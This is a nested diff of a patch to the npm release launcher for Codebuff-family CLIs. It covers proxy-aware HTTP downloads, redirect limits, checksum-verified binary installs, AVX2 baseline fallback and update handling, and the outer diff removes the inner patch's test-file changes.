@@ -2,7 +2,16 @@ diff --git a/cli/release-core/README.md b/cli/release-core/README.md
 index 85633af91..bfbfa2b86 100644
 --- a/cli/release-core/README.md
 +++ b/cli/release-core/README.md
-@@ -10,6 +10,34 @@ The npm packages must remain standalone, so their `prepack` scripts copy
+@@ -1,20 +1,48 @@
+ # Release launcher core
+ 
+ This directory is the canonical implementation of the npm launchers used by
+ Codebuff, Codecane, and Freebuff. Each product keeps a small `index.js` in its
+ release package that supplies product-specific configuration to
+ `createLauncher()`.
+ 
+ The npm packages must remain standalone, so their `prepack` scripts copy
+ `launcher.js` and `http.js` into the package directory. `postpack` removes those
  generated, gitignored files again. No lifecycle scripts run when users install
  or uninstall the packages.
  
@@ -37,11 +46,19 @@ index 85633af91..bfbfa2b86 100644
  When changing launcher behavior, edit this directory and test all package
  assemblies with:
  
+ ```bash
+ npm pack ./cli/release --dry-run
+ npm pack ./cli/release-staging --dry-run
+ npm pack ./freebuff/cli/release --dry-run
+ ```
 diff --git a/cli/release-core/http.js b/cli/release-core/http.js
 index ac613952c..14d411f74 100644
 --- a/cli/release-core/http.js
 +++ b/cli/release-core/http.js
-@@ -4,6 +4,73 @@ const fs = require('fs')
+@@ -1,31 +1,98 @@
+ const http = require('http')
+ const https = require('https')
+ const fs = require('fs')
  const { pipeline } = require('stream/promises')
  const tls = require('tls')
  
@@ -115,7 +132,51 @@ index ac613952c..14d411f74 100644
  function createReleaseHttpClient({
    env = process.env,
    userAgent,
-@@ -200,8 +267,22 @@ function createReleaseHttpClient({
+   requestTimeout,
+   httpModule = http,
+   httpsModule = https,
+   fsModule = fs,
+   pipelineFn = pipeline,
+   tlsModule = tls,
+ }) {
+   function getProxyUrl(protocol = 'https:') {
+     if (protocol === 'http:') {
+       return (
+         env.HTTP_PROXY ||
+         env.http_proxy ||
+         env.HTTPS_PROXY ||
+         env.https_proxy ||
+         null
+       )
+     }
+     return (
+       env.HTTPS_PROXY ||
+       env.https_proxy ||
+       env.HTTP_PROXY ||
+       env.http_proxy ||
+@@ -178,52 +245,66 @@ function createReleaseHttpClient({
+ 
+     reqOptions.agent = new TunnelAgent({ keepAlive: false })
+     return { transport: httpsModule, reqOptions }
+   }
+ 
+   async function httpGet(url, options = {}) {
+     const redirectCount = options.redirectCount || 0
+     const { transport, reqOptions } = await buildRequest(url, options)
+ 
+     return new Promise((resolve, reject) => {
+       const req = transport.get(reqOptions, (res) => {
+         if ([301, 302, 303, 307, 308].includes(res.statusCode)) {
+           res.resume()
+ 
+           if (!res.headers.location) {
+             reject(
+               new Error(`Redirect ${res.statusCode} missing Location header.`),
+             )
+             return
+           }
+           if (redirectCount >= (options.maxRedirects ?? 10)) {
+             reject(new Error('Too many redirects.'))
              return
            }
  
@@ -139,7 +200,51 @@ index ac613952c..14d411f74 100644
              redirectCount: redirectCount + 1,
            })
              .then(resolve)
-@@ -436,4 +517,5 @@ function createReleaseHttpClient({
+             .catch(reject)
+           return
+         }
+ 
+         res.requestUrl = url
+         resolve(res)
+       })
+ 
+       req.on('error', (error) => {
+         error.requestUrl = url
+         reject(error)
+       })
+       req.setTimeout(options.timeout || requestTimeout, () => {
+         req.destroy()
+         const error = new Error('Request timeout.')
+         error.code = 'ETIMEDOUT'
+         error.requestUrl = url
+         reject(error)
+       })
+     })
+   }
+ 
+@@ -414,26 +495,27 @@ function createReleaseHttpClient({
+     for (let attempt = 1; ; attempt++) {
+       try {
+         return await operation(attempt)
+       } catch (error) {
+         if (attempt >= maxAttempts || !shouldRetry(error)) {
+           throw error
+         }
+ 
+         const delayMs = baseDelayMs * 2 ** (attempt - 1)
+         await onRetry({ error, attempt, nextAttempt: attempt + 1, delayMs })
+         await sleep(delayMs)
+       }
+     }
+   }
+ 
+   return {
+     getProxyUrl,
+     downloadFile,
+     httpGet,
+     withRetries,
+   }
+ }
  
  module.exports = {
    createReleaseHttpClient,
@@ -149,7 +254,7 @@ diff --git a/cli/release-core/launcher.js b/cli/release-core/launcher.js
 index 867c1d5d6..a654d087d 100644
 --- a/cli/release-core/launcher.js
 +++ b/cli/release-core/launcher.js
-@@ -1,6 +1,7 @@
+@@ -1,44 +1,161 @@
  #!/usr/bin/env node
  
  const { spawn } = require('child_process')
@@ -157,7 +262,11 @@ index 867c1d5d6..a654d087d 100644
  const fs = require('fs')
  const http = require('http')
  const https = require('https')
-@@ -12,11 +13,127 @@ const zlib = require('zlib')
+ const os = require('os')
+ const path = require('path')
+ const { pipeline } = require('stream/promises')
+ const zlib = require('zlib')
+ 
  const tar = require('tar')
  const { createReleaseHttpClient } = require('./http')
  
@@ -285,7 +394,51 @@ index 867c1d5d6..a654d087d 100644
      includeTreeSitterWasm = true,
      startupBanner = [],
      telemetryEvent = 'cli.update_codebuff_failed',
-@@ -228,15 +345,14 @@ function createLauncher(productConfig) {
+     telemetryProperties = {},
+     tempDownloadDirName = `.${packageName}-download-temp`,
+     // Tests only. os.homedir() ignores $HOME under `bun test`, so pointing HOME
+     // at a temp dir is not enough to keep a test off the real ~/.config.
+     configDir: configDirOverride = null,
+   } = productConfig
+ 
+   /**
+    * Terminal escape sequences to reset terminal state after the child process exits.
+    * When the binary is SIGKILL'd, it can't clean up its own terminal state.
+    * The wrapper (this process) survives and must reset these modes.
+    */
+   const EXIT_ALTERNATE_SCREEN_SEQUENCE = '\x1b[?1049l'
+   const SAFE_TERMINAL_RESET_SEQUENCES =
+     '\x1b[?1000l' + // Disable X10 mouse mode
+     '\x1b[?1002l' + // Disable button event mouse mode
+     '\x1b[?1003l' + // Disable any-event mouse mode (all motion)
+     '\x1b[?1006l' + // Disable SGR extended mouse mode
+     '\x1b[?1004l' + // Disable focus reporting
+     '\x1b[?2004l' + // Disable bracketed paste mode
+     '\x1b[<u' + // Pop kitty keyboard protocol flags
+     '\x1b[>4;0m' + // Reset modifyOtherKeys
+@@ -206,59 +323,58 @@ function createLauncher(productConfig) {
+       })
+ 
+       const parsedUrl = new URL(`${posthogConfig.host}/capture/`)
+       const isHttps = parsedUrl.protocol === 'https:'
+       const options = {
+         hostname: parsedUrl.hostname,
+         port: parsedUrl.port || (isHttps ? 443 : 80),
+         path: parsedUrl.pathname + parsedUrl.search,
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json',
+           'Content-Length': Buffer.byteLength(payload),
+         },
+       }
+ 
+       const transport = isHttps ? https : http
+       const req = transport.request(options)
+       req.on('error', () => {}) // Silently ignore errors
+       req.write(payload)
+       req.end()
+     } catch (e) {
+       // Silently ignore any tracking errors
      }
    }
  
@@ -309,7 +462,51 @@ index 867c1d5d6..a654d087d 100644
  
    const BASELINE_FALLBACK_TARGETS = {
      'linux-x64': 'linux-x64-baseline',
-@@ -424,23 +540,90 @@ function createLauncher(productConfig) {
+     'win32-x64': 'win32-x64-baseline',
+   }
+ 
+   const term = {
+     clearLine: () => {
+       if (process.stderr.isTTY) {
+         process.stderr.write('\r\x1b[K')
+       }
+     },
+     write: (text) => {
+       term.clearLine()
+       process.stderr.write(text)
+     },
+     writeLine: (text) => {
+       term.clearLine()
+       process.stderr.write(text + '\n')
+     },
+   }
+ 
+   function getPlatformKey() {
+     return `${process.platform}-${process.arch}`
+   }
+@@ -402,67 +518,134 @@ function createLauncher(productConfig) {
+     if (override) {
+       return target === override
+     }
+     // Check the baseline fallback first: it's always safe on its platform and
+     // avoids running CPU detection when a baseline binary is already installed.
+     return (
+       target === getBaselineFallbackTargetKey() ||
+       target === getDefaultTargetKey()
+     )
+   }
+ 
+   function getDownloadTargetKey() {
+     const override = getTargetOverride()
+     if (override) {
+       return override
+     }
+ 
+     const metadata = getCurrentMetadata()
+     if (metadata?.target && isTargetAllowedForThisMachine(metadata.target)) {
+       return metadata.target
+     }
+ 
      return getDefaultTargetKey()
    }
  
@@ -404,7 +601,51 @@ index 867c1d5d6..a654d087d 100644
    function streamToString(stream) {
      return new Promise((resolve, reject) => {
        let data = ''
-@@ -609,6 +792,19 @@ function createLauncher(productConfig) {
+       stream.on('data', (chunk) => (data += chunk))
+       stream.on('end', () => resolve(data))
+       stream.on('error', reject)
+     })
+   }
+ 
+   function getCurrentVersion() {
+     try {
+       const metadata = getCurrentMetadata()
+       if (!metadata) {
+         return null
+       }
+       // Also verify the binary still exists
+       if (!fs.existsSync(CONFIG.binaryPath)) {
+         return null
+       }
+       const metadataTarget = metadata.target || getPlatformKey()
+       if (!isTargetAllowedForThisMachine(metadataTarget)) {
+         return null
+       }
+       return getMetadataVersion(metadata)
+     } catch (error) {
+@@ -587,210 +770,281 @@ function createLauncher(productConfig) {
+     } catch (error) {
+       if (error.code !== 'ENOENT') throw error
+     }
+   }
+ 
+   function formatDownloadSource(downloadUrl) {
+     try {
+       const parsedUrl = new URL(downloadUrl)
+       return `${parsedUrl.origin}${parsedUrl.pathname}`
+     } catch {
+       return downloadUrl
+     }
+   }
+ 
+   function printDownloadFailure(error) {
+     const code = error.code ? ` (${error.code})` : ''
+     console.error(
+       `❌ Failed to download ${packageName}: ${error.message}${code}`,
+     )
+ 
+     if (error.requestUrl) {
+       console.error(
          `Download source: ${formatDownloadSource(error.requestUrl)}`,
        )
      }
@@ -424,7 +665,25 @@ index 867c1d5d6..a654d087d 100644
      if (error.downloadedBytes > 0) {
        const total = error.totalBytes
          ? ` of ${formatBytes(error.totalBytes)}`
-@@ -634,11 +830,26 @@ function createLauncher(productConfig) {
+         : ''
+       console.error(
+         `Saved ${formatBytes(error.downloadedBytes)}${total}; the next run will resume this download.`,
+       )
+     } else if (error.requestUrl) {
+       console.error(
+         'Please retry. The release host may be temporarily unavailable.',
+       )
+     } else {
+       console.error(
+         'The downloaded update could not be installed; the existing binary was preserved when possible.',
+       )
+     }
+   }
+ 
+   function prepareTempDownloadDir() {
+     if (fs.existsSync(CONFIG.tempDownloadDir)) {
+       fs.rmSync(CONFIG.tempDownloadDir, { recursive: true })
+     }
      fs.mkdirSync(CONFIG.tempDownloadDir, { recursive: true })
    }
  
@@ -452,7 +711,38 @@ index 867c1d5d6..a654d087d 100644
    ) {
      let attempts = 0
      const partialArchivePath = getPartialArchivePath(version, targetKey)
-@@ -677,11 +888,33 @@ function createLauncher(productConfig) {
+     let totalBytes = null
+ 
+     try {
+       return await withRetries(
+         async (attempt) => {
+           attempts = attempt
+           prepareTempDownloadDir()
+           if (!quiet) term.write('Downloading...')
+ 
+           let lastProgressTime = Date.now()
+           const result = await downloadFile(downloadUrl, partialArchivePath, {
+             timeout: CONFIG.downloadRequestTimeout,
+             onProgress: ({ downloadedBytes, totalBytes: progressTotal }) => {
+               totalBytes = progressTotal
+               if (quiet) return
+               const now = Date.now()
+               if (
+                 now - lastProgressTime < 100 &&
+                 downloadedBytes !== progressTotal
+               ) {
+                 return
+               }
+               lastProgressTime = now
+               if (progressTotal) {
+                 const pct = Math.round((downloadedBytes / progressTotal) * 100)
+                 term.write(
+                   `Downloading... ${createProgressBar(pct)} ${pct}% of ${formatBytes(progressTotal)}`,
+                 )
+               } else {
+                 term.write(`Downloading... ${formatBytes(downloadedBytes)}`)
+               }
+             },
            })
            totalBytes = result.totalBytes
  
@@ -487,7 +777,44 @@ index 867c1d5d6..a654d087d 100644
              )
            } catch (error) {
              // A complete archive that cannot be extracted is corrupt. Do not
-@@ -726,7 +959,7 @@ function createLauncher(productConfig) {
+             // resume it on the next attempt.
+             removeFileIfPresent(partialArchivePath)
+             throw error
+           }
+ 
+           const tempBinaryPath = path.join(
+             CONFIG.tempDownloadDir,
+             CONFIG.binaryName,
+           )
+           if (!fs.existsSync(tempBinaryPath)) {
+             const files = fs.readdirSync(CONFIG.tempDownloadDir)
+             removeFileIfPresent(partialArchivePath)
+             const error = new Error(
+               `Binary not found after extraction. Expected: ${CONFIG.binaryName}, Available files: ${files.join(', ')}`,
+             )
+             error.retryable = false
+             throw error
+           }
+ 
+           removeFileIfPresent(partialArchivePath)
+           return tempBinaryPath
+         },
+         {
+           maxAttempts: CONFIG.downloadMaxAttempts,
+           shouldRetry: isRetryableDownloadError,
+           onRetry: ({ nextAttempt, delayMs }) => {
+             if (quiet) return
+             term.writeLine(
+               `Download interrupted. Retrying in ${delayMs / 1000}s (${nextAttempt}/${CONFIG.downloadMaxAttempts})...`,
+             )
+           },
+         },
+       )
+     } catch (error) {
+       try {
+         fs.rmSync(CONFIG.tempDownloadDir, { recursive: true, force: true })
+       } catch {
+         // Best effort after a failed download.
        }
  
        trackUpdateFailed(error.message, version, {
@@ -496,7 +823,32 @@ index 867c1d5d6..a654d087d 100644
          errorCode: error.code,
          statusCode: error.statusCode,
          target: targetKey,
-@@ -759,16 +992,37 @@ function createLauncher(productConfig) {
+         attempts,
+         bytesDownloaded: getFileSize(partialArchivePath),
+         totalBytes: error.totalBytes || totalBytes,
+       })
+       error.downloadedBytes = getFileSize(partialArchivePath)
+       error.totalBytes ||= totalBytes
+       error.requestUrl ||= downloadUrl
+       throw error
+     }
+   }
+ 
+   async function stageBinary(
+     version,
+     targetKey = getDownloadTargetKey(),
+     options = {},
+   ) {
+     const fileName = PLATFORM_TARGETS[targetKey]
+ 
+     if (!fileName) {
+       const error = new Error(
+         `Unsupported platform: ${process.platform} ${process.arch}`,
+       )
+       trackUpdateFailed(error.message, version, {
+         stage: 'platform_check',
+         target: targetKey,
+       })
        throw error
      }
  
@@ -538,7 +890,51 @@ index 867c1d5d6..a654d087d 100644
      )
  
      try {
-@@ -881,8 +1135,12 @@ function createLauncher(productConfig) {
+       if (process.platform !== 'win32') {
+         fs.chmodSync(tempBinaryPath, 0o755)
+       }
+     } catch (error) {
+       try {
+         fs.rmSync(CONFIG.tempDownloadDir, { recursive: true, force: true })
+       } catch {
+         // Preserve the original chmod error.
+       }
+       throw error
+     }
+ 
+     return { tempBinaryPath, version, targetKey }
+   }
+ 
+   function replaceFileWithRollback(sourcePath, targetPath, replacements) {
+     const backupPath = fs.existsSync(targetPath)
+       ? `${targetPath}.old.${Date.now()}.${replacements.length}`
+       : null
+ 
+     if (backupPath) {
+       fs.renameSync(targetPath, backupPath)
+@@ -859,88 +1113,102 @@ function createLauncher(productConfig) {
+           )
+           replaceFileWithRollback(tempWasmPath, targetWasmPath, replacements)
+         }
+       }
+ 
+       replaceFileWithRollback(
+         metadataTempPath,
+         CONFIG.metadataPath,
+         replacements,
+       )
+       commitReplacements(replacements)
+     } catch (error) {
+       rollbackReplacements(replacements)
+       throw error
+     } finally {
+       removeFileIfPresent(metadataTempPath)
+       if (fs.existsSync(CONFIG.tempDownloadDir)) {
+         fs.rmSync(CONFIG.tempDownloadDir, { recursive: true })
+       }
+     }
+ 
+     term.clearLine()
      console.log(`Download complete! Starting ${displayName}...`)
    }
  
@@ -553,7 +949,27 @@ index 867c1d5d6..a654d087d 100644
      installStagedBinary(stagedBinary)
    }
  
-@@ -910,7 +1168,15 @@ function createLauncher(productConfig) {
+   function getRequiredWrapperVersion(currentVersion) {
+     if (
+       !wrapperVersion ||
+       (currentVersion !== null &&
+         compareVersions(currentVersion, wrapperVersion) >= 0)
+     ) {
+       return null
+     }
+     return wrapperVersion
+   }
+ 
+   async function ensureBinaryReady() {
+     const currentVersion = getCurrentVersion()
+     const requiredWrapperVersion = getRequiredWrapperVersion(currentVersion)
+ 
+     if (currentVersion !== null && requiredWrapperVersion === null) {
+       return
+     }
+ 
+     // npm installs update this JavaScript wrapper but intentionally preserve the
+     // downloaded binary. If that binary exits before the background update
      // check starts, it can otherwise remain stuck forever. The wrapper and its
      // release binary share a version, so repair that stale cache synchronously
      // without adding a registry lookup to healthy launches.
@@ -570,7 +986,7 @@ index 867c1d5d6..a654d087d 100644
      if (!version) {
        console.error('❌ Failed to determine latest version')
        console.error('Please check your internet connection and try again')
-@@ -918,7 +1184,9 @@ function createLauncher(productConfig) {
+       process.exit(1)
      }
  
      try {
@@ -581,7 +997,51 @@ index 867c1d5d6..a654d087d 100644
      } catch (error) {
        term.clearLine()
        printDownloadFailure(error)
-@@ -977,7 +1245,10 @@ function createLauncher(productConfig) {
+       if (currentVersion !== null) {
+         console.error(
+           `Continuing with cached ${packageName} ${currentVersion}.`,
+         )
+         return
+       }
+       process.exit(1)
+     }
+   }
+ 
+   function stopRunningProcess(runningProcess) {
+     return new Promise((resolve, reject) => {
+       let forceKillTimer
+       let forceKillTimeout
+ 
+       const cleanup = () => {
+         clearTimeout(forceKillTimer)
+         clearTimeout(forceKillTimeout)
+         runningProcess.removeListener('exit', handleExit)
+       }
+       const handleExit = () => {
+         cleanup()
+@@ -955,71 +1223,75 @@ function createLauncher(productConfig) {
+       forceKillTimer = setTimeout(() => {
+         forceKillTimeout = setTimeout(() => {
+           fail(new Error(`${packageName} did not exit after SIGKILL`))
+         }, 1000)
+         try {
+           runningProcess.kill('SIGKILL')
+         } catch (error) {
+           fail(error)
+         }
+       }, 5000)
+       try {
+         runningProcess.kill('SIGTERM')
+       } catch (error) {
+         fail(error)
+       }
+     })
+   }
+ 
+   async function checkForUpdates(runningProcess, exitListener) {
+     // main() schedules this 100ms after launch, so the binary it was handed can
+     // already be dead — a startup crash that handed off to the baseline
+     // fallback, most of all. Updating around a corpse would race that
      // relaunch's download for the shared temp directory (prepareTempDownloadDir
      // rmSyncs it) and then spend six seconds SIGKILLing a process that has
      // already exited.
@@ -593,7 +1053,8 @@ index 867c1d5d6..a654d087d 100644
        return
      }
  
-@@ -986,7 +1257,8 @@ function createLauncher(productConfig) {
+     let stoppedForUpdate = false
+ 
      try {
        const currentVersion = getCurrentVersion()
  
@@ -603,7 +1064,10 @@ index 867c1d5d6..a654d087d 100644
        if (!latestVersion) return
  
        if (
-@@ -997,7 +1269,7 @@ function createLauncher(productConfig) {
+         // Download new version if current version is unknown or outdated.
+         currentVersion === null ||
+         compareVersions(currentVersion, latestVersion) < 0
+       ) {
          const stagedBinary = await stageBinary(
            latestVersion,
            getDownloadTargetKey(),
@@ -612,7 +1076,51 @@ index 867c1d5d6..a654d087d 100644
          )
  
          term.clearLine()
-@@ -1361,7 +1633,13 @@ function createLauncher(productConfig) {
+ 
+         runningProcess.removeListener('exit', exitListener)
+         try {
+           await stopRunningProcess(runningProcess)
+         } catch (error) {
+           runningProcess.on('exit', exitListener)
+           throw error
+         }
+         stoppedForUpdate = true
+ 
+         resetTerminal({ exitAlternateScreen: true })
+         console.log(`Update available: ${currentVersion} → ${latestVersion}`)
+ 
+         installStagedBinary(stagedBinary)
+ 
+         const newChild = spawnInstalledBinary({ detached: false })
+         attachExitHandler(newChild)
+ 
+         return new Promise(() => {})
+       }
+     } catch (error) {
+       if (stoppedForUpdate && fs.existsSync(CONFIG.binaryPath)) {
+@@ -1339,67 +1611,73 @@ function createLauncher(productConfig) {
+       return false
+     }
+ 
+     // An explicit target is the user's decision; don't download over it.
+     if (getTargetOverride()) {
+       return false
+     }
+ 
+     const metadata = getCurrentMetadata()
+     const currentTarget = metadata?.target || getDefaultTargetKey()
+     if (currentTarget === fallbackTarget) {
+       return false
+     }
+ 
+     // Only a confirmed illegal instruction gets written down. Persisting it
+     // before the download is what caps the cost at one crash: even if the
+     // download or the relaunch fails, we never optimistically pick the AVX2
+     // build again. A suspected crash records nothing — installing the baseline
+     // already keeps this machine on it, so a guess that turns out to be wrong
+     // costs the slower build instead of leaving cpu-features.json asserting a
+     // CPU limitation we never observed.
+     if (confirmed) {
        recordMachineLacksAvx2()
      }
  
@@ -627,7 +1135,15 @@ index 867c1d5d6..a654d087d 100644
      if (!version) {
        return false
      }
-@@ -1377,7 +1655,7 @@ function createLauncher(productConfig) {
+ 
+     resetTerminal({
+       exitAlternateScreen: shouldExitAlternateScreen(code, signal),
+     })
+     console.error('')
+     console.error(
+       confirmed
+         ? `${packageName} is switching to the older-CPU binary for this machine.`
+         : `${packageName} crashed on startup; trying the older-CPU binary.`,
      )
  
      try {
@@ -636,7 +1152,51 @@ index 867c1d5d6..a654d087d 100644
      } catch (error) {
        term.clearLine()
        console.error(`Failed to download ${fallbackTarget}: ${error.message}`)
-@@ -1461,9 +1739,22 @@ function createLauncher(productConfig) {
+       return false
+     }
+ 
+     const child = spawnInstalledBinary({ detached: false })
+     attachExitHandler(child, false)
+     return true
+   }
+ 
+   function attachExitHandler(child, allowBaselineFallback = true) {
+     const exitListener = async (code, signal) => {
+       // A child we never watched (only reachable from a test) reports no age
+       // rather than a suspiciously young one: absent evidence must not be read
+       // as a startup crash and trigger a download.
+       const msAlive = child.launch ? child.launch.msAlive() : Infinity
+ 
+       let stderrTail = ''
+       if (child.launch && (isWindowsNativeCrashCode(code) || signal)) {
+         await child.launch.drained()
+         stderrTail = child.launch.stderrTail()
+       }
+ 
+       if (
+@@ -1439,31 +1717,44 @@ function createLauncher(productConfig) {
+   return {
+     config: productConfig,
+     main,
+     stopRunningProcess,
+     // Internals exposed for tests only. The AVX2 path is optimistic-then-
+     // corrected (see detectMachineHasAvx2), so the correction has to be
+     // exercised directly — there is no way to make a CI runner lack AVX2.
+     __testing: {
+       detectMachineHasAvx2,
+       recordMachineLacksAvx2,
+       readCachedAvx2,
+       isIllegalInstructionExit,
+       isStartupCpuFeatureCrash,
+       tryFallbackToBaseline,
+       printCrashDiagnostics,
+       checkForUpdates,
+       spawnInstalledBinary,
+       attachExitHandler,
+       getDefaultTargetKey,
+       getCpuFeatureCachePath,
+       getCurrentVersion,
+       getMetadataVersion,
        getRequiredWrapperVersion,
        ensureBinaryReady,
        isTargetAllowedForThisMachine,
@@ -878,7 +1438,24 @@ diff --git a/cli/release-staging/index.js b/cli/release-staging/index.js
 index 34bc6ef42..42ddef2e5 100644
 --- a/cli/release-staging/index.js
 +++ b/cli/release-staging/index.js
-@@ -18,10 +18,13 @@ const { createLauncher } = require(
+@@ -1,43 +1,46 @@
+ #!/usr/bin/env node
+ 
+ const fs = require('fs')
+ const path = require('path')
+ 
+ const packagedLauncherPath = path.join(__dirname, 'launcher.js')
+ const sourceLauncherPath = path.join(
+   __dirname,
+   '..',
+   'release-core',
+   'launcher.js',
+ )
+ // Published packages must not let an unrelated sibling path shadow their
+ // bundled launcher. Source checkouts only fall back when that copy is absent.
+ const { createLauncher } = require(
+   fs.existsSync(packagedLauncherPath)
+     ? packagedLauncherPath
      : sourceLauncherPath,
  )
  
@@ -893,11 +1470,44 @@ index 34bc6ef42..42ddef2e5 100644
    includeTreeSitterWasm: false,
    startupBanner: [
      '\x1b[1m\x1b[91m' + '='.repeat(60) + '\x1b[0m',
+     '\x1b[1m\x1b[93m❄️ CODECANE STAGING ENVIRONMENT ❄️\x1b[0m',
+     '\x1b[1m\x1b[91mFOR TESTING PURPOSES ONLY - NOT FOR PRODUCTION USE\x1b[0m',
+     '\x1b[1m\x1b[91m' + '='.repeat(60) + '\x1b[0m',
+   ],
+   telemetryProperties: { isStaging: true },
+   tempDownloadDirName: '.download-temp-staging',
+ })
+ 
+ module.exports = launcher
+ 
+ if (require.main === module) {
+   launcher.main().catch((error) => {
+     console.error('❌ Unexpected error:', error.message)
+     process.exit(1)
+   })
+ }
 diff --git a/cli/release/index.js b/cli/release/index.js
 index abd819378..880836bfe 100644
 --- a/cli/release/index.js
 +++ b/cli/release/index.js
-@@ -18,10 +18,13 @@ const { createLauncher } = require(
+@@ -1,35 +1,38 @@
+ #!/usr/bin/env node
+ 
+ const fs = require('fs')
+ const path = require('path')
+ 
+ const packagedLauncherPath = path.join(__dirname, 'launcher.js')
+ const sourceLauncherPath = path.join(
+   __dirname,
+   '..',
+   'release-core',
+   'launcher.js',
+ )
+ // Published packages must not let an unrelated sibling path shadow their
+ // bundled launcher. Source checkouts only fall back when that copy is absent.
+ const { createLauncher } = require(
+   fs.existsSync(packagedLauncherPath)
+     ? packagedLauncherPath
      : sourceLauncherPath,
  )
  
@@ -912,997 +1522,34 @@ index abd819378..880836bfe 100644
    tempDownloadDirName: '.download-temp',
  })
  
-diff --git a/cli/src/__tests__/cli-args.test.ts b/cli/src/__tests__/cli-args.test.ts
-index 505ea7468..c8c3db485 100644
---- a/cli/src/__tests__/cli-args.test.ts
-+++ b/cli/src/__tests__/cli-args.test.ts
-@@ -178,4 +178,33 @@ describe('Freebuff CLI Argument Parsing', () => {
-     expect(result.command).toBe('login')
-     expect(result.initialPrompt).toBeNull()
+ module.exports = launcher
+ 
+ if (require.main === module) {
+   launcher.main().catch((error) => {
+     console.error('❌ Unexpected error:', error.message)
+     process.exit(1)
    })
-+
-+  test('parses --trust-agents and defaults it to false', () => {
-+    expect(
-+      parseArgs({
-+        argv: ['node', 'freebuff', '--trust-agents'],
-+        isFreebuff: true,
-+        version: '1.0.0',
-+      }).trustAgents,
-+    ).toBe(true)
-+    expect(
-+      parseArgs({
-+        argv: ['node', 'freebuff'],
-+        isFreebuff: true,
-+        version: '1.0.0',
-+      }).trustAgents,
-+    ).toBe(false)
-+  })
-+})
-+
-+describe('Codebuff --trust-agents', () => {
-+  test('parses --trust-agents alongside a prompt', () => {
-+    const result = parseArgs({
-+      argv: ['node', 'codebuff', '--trust-agents', 'fix', 'it'],
-+      isFreebuff: false,
-+      version: '1.0.0',
-+    })
-+    expect(result.trustAgents).toBe(true)
-+    expect(result.initialPrompt).toBe('fix it')
-+  })
- })
-diff --git a/cli/src/__tests__/launcher-avx2-fallback.test.ts b/cli/src/__tests__/launcher-avx2-fallback.test.ts
-index ff32c0a90..5b18e1931 100644
---- a/cli/src/__tests__/launcher-avx2-fallback.test.ts
-+++ b/cli/src/__tests__/launcher-avx2-fallback.test.ts
-@@ -14,6 +14,7 @@
-  * forever instead.
-  */
- import { execFileSync } from 'child_process'
-+import { createHash } from 'crypto'
- import {
-   existsSync,
-   mkdirSync,
-@@ -65,8 +66,15 @@ function makeLauncher(
-     configurable: true,
-   })
-   Object.defineProperty(process, 'arch', { value: arch, configurable: true })
--  return createLauncher({ packageName: 'freebuff', configDir: tempConfigDir })
--    .__testing
-+  return createLauncher({
-+    packageName: 'freebuff',
-+    configDir: tempConfigDir,
-+    // The wrapper shares the installed version, so the archive checksums come
-+    // from its own manifest — `releaseChecksums`, filled by the test — and
-+    // never from a registry lookup.
-+    wrapperVersion: '1.2.3',
-+    binaryChecksums: releaseChecksums,
-+  }).__testing
  }
- 
- /** Poll until `done()`, so tests wait on the event rather than on a timer. */
-@@ -83,7 +91,10 @@ async function waitFor(done: () => boolean, timeoutMs = 5000) {
-  * matters beyond the assertions: a relaunched child's handler firing after a
-  * test would otherwise call the real process.exit and take the runner down.
-  */
--const launcher = { lines: [] as string[], exitCodes: [] as (number | undefined)[] }
-+const launcher = {
-+  lines: [] as string[],
-+  exitCodes: [] as (number | undefined)[],
-+}
- let restoreLauncherCapture = () => {}
- 
- function captureLauncherOutput() {
-@@ -123,7 +134,20 @@ function baselineTarball(script: string) {
-  * treats as final — so failure paths fail fast instead of backing off.
-  */
- let releaseTarball: Buffer | null = null
-+/**
-+ * What the wrapper's package.json says the baseline archive hashes to. A
-+ * placeholder by default so a download is attempted (and 404s) as it always
-+ * did; `serveBaselineTarball` replaces it with the real digest.
-+ */
-+let releaseChecksums: Record<string, string> = {}
- let releaseServer: ReturnType<typeof createServer>
-+
-+function serveBaselineTarball(script: string) {
-+  releaseTarball = baselineTarball(script)
-+  releaseChecksums['win32-x64-baseline'] = createHash('sha256')
-+    .update(releaseTarball)
-+    .digest('hex')
-+}
- let restoreReleaseEnv = () => {}
- 
- beforeAll(async () => {
-@@ -170,6 +194,7 @@ beforeEach(() => {
-   originalPlatform = Object.getOwnPropertyDescriptor(process, 'platform')
-   originalArch = Object.getOwnPropertyDescriptor(process, 'arch')
-   releaseTarball = null
-+  releaseChecksums = { 'win32-x64-baseline': '0'.repeat(64) }
-   restoreLauncherCapture = captureLauncherOutput()
- })
- 
-@@ -201,9 +226,9 @@ describe('windows AVX2 detection', () => {
- 
-     expect(t.detectMachineHasAvx2()).toBe(false)
-     expect(t.readCachedAvx2()).toBe(false)
--    expect(JSON.parse(readFileSync(t.getCpuFeatureCachePath(), 'utf8'))).toEqual(
--      { avx2: false },
--    )
-+    expect(
-+      JSON.parse(readFileSync(t.getCpuFeatureCachePath(), 'utf8')),
-+    ).toEqual({ avx2: false })
-   })
- 
-   test('a recorded failure selects baseline up front on the NEXT launch', () => {
-@@ -265,7 +290,10 @@ describe('windows AVX2 detection', () => {
- describe('recovery after a recorded failure', () => {
-   /** Simulate a completed install of `target` at `version`. */
-   function installBinary(t: ReturnType<typeof makeLauncher>, target: string) {
--    writeFileSync(t.CONFIG.metadataPath, JSON.stringify({ version: '1.2.3', target }))
-+    writeFileSync(
-+      t.CONFIG.metadataPath,
-+      JSON.stringify({ version: '1.2.3', target }),
-+    )
-     writeFileSync(t.CONFIG.binaryPath, 'pretend binary')
-   }
- 
-@@ -580,7 +608,7 @@ describe('recovering from the reported crash', () => {
-   test('0xC0000409 during startup lands the user on the baseline build', async () => {
-     const t = makeLauncher()
-     const ranMarker = join(tempConfigDir, 'baseline-ran')
--    releaseTarball = baselineTarball(`echo ran > ${ranMarker}`)
-+    serveBaselineTarball(`echo ran > ${ranMarker}`)
- 
-     writeFileSync(t.CONFIG.binaryPath, '#!/bin/sh\nexit 3\n', { mode: 0o755 })
-     writeFileSync(
-diff --git a/cli/src/__tests__/release/download-integrity.test.ts b/cli/src/__tests__/release/download-integrity.test.ts
-new file mode 100644
-index 000000000..a955ef946
---- /dev/null
-+++ b/cli/src/__tests__/release/download-integrity.test.ts
-@@ -0,0 +1,775 @@
-+/**
-+ * The npm launcher used to download a tarball, check that a file with the
-+ * binary's name came out of it, chmod it and run it — no checksum, no
-+ * signature, an origin read from the environment at runtime, and redirects
-+ * followed to any host over any protocol. These tests pin the three fences
-+ * that replaced that:
-+ *
-+ *  - the download origin must be https (or http on localhost),
-+ *  - a redirect may never downgrade to http or leave the release hosts,
